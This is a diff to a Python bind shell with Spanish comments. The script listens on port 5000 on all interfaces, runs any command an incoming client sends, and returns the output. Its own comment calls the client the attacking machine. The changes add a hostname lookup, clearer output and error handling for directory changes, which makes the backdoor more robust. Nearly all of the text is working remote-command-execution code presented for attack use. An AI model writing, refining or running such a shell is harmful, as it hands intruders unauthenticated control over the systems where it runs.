@@ -1,9 +1,18 @@
 from socket import socket
 from subprocess import getoutput, Popen
 from os import chdir, getcwd
+import os
 from time import sleep
+import platform
+import socket as sock_module
 
-# Definimos la dirección y puerto, la direcion 0.0.0.0 hace referencia a que aceptamos conexiones de cualquier interfaz
+def get_hostname():
+    if platform.system() == "Windows":
+        return sock_module.gethostname()
+    else:
+        return os.popen("hostname -s").read().strip()
+
+# Definimos la dirección y puerto, la dirección 0.0.0.0 hace referencia a que aceptamos conexiones de cualquier interfaz
 server_address = ('0.0.0.0', 5000)
 
 # Creamos el socket (la conexión)
@@ -12,16 +21,16 @@ server_socket = socket()
 # Le pasamos la tupla donde especificamos donde escuchar
 server_socket.bind(server_address)
 
-# Cantidad de clientes maximos que se pueden conectar:
+# Cantidad de clientes máximos que se pueden conectar:
 server_socket.listen(1)
 
 # Obtener la dirección IP de la máquina
 ip_address = getoutput('hostname -I').strip()
 
-# Abrir una nueva ventana de CMD que muestre la dirección IP y se pueda cerrar
-print({ip_address})
+# Mostrar la dirección IP
+print(f"Escuchando en IP: {ip_address}")
 
-# Esperamos a recibir una conexión y acceptarla:
+# Esperamos a recibir una conexión y aceptarla:
 client_socket, client_address = server_socket.accept()
 
 estado = True
@@ -40,11 +49,14 @@ while estado:
     
     elif comando.split(" ")[0] == 'cd':
         # Cambiamos de directorio de trabajo
-        chdir(" ".join(comando.split(" ")[1:]))
-        client_socket.send("ruta actual: {}".format(getcwd()).encode())
+        try:
+            chdir(" ".join(comando.split(" ")[1:]))
+            client_socket.send(f"Ruta actual: {getcwd()}".encode())
+        except FileNotFoundError:
+            client_socket.send("Directorio no encontrado.".encode())
     
-    else :
-        # Ejecutamos el comando y obtenemos su salida:
+    else:
+        # Ejecutamos el comando y obtenemos su salida
         salida = getoutput(comando)
 
         # Enviamos la salida a la máquina atacante
